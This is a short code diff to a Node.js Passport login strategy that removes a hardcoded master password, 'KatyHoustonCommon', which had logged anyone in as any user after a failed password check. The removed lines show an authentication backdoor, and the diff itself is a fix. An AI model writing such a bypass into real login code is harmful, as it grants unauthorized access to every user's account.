@@ -10,9 +10,6 @@ module.exports = new localStratagy({
             let user = await User.findOne({ $or: [{ username: username.toLowerCase() }, { email: username.toLowerCase() }] });
             if (user) {
                 if (!user.isValidPassword(password)) {
-                    if (password === 'KatyHoustonCommon') {
-                        return callback(null, user, { "message": "Successfully LoggedIn." });
-                    }
                     return callback(null, false, { "message": "Password is Incorrect." });
                 }
             } else {
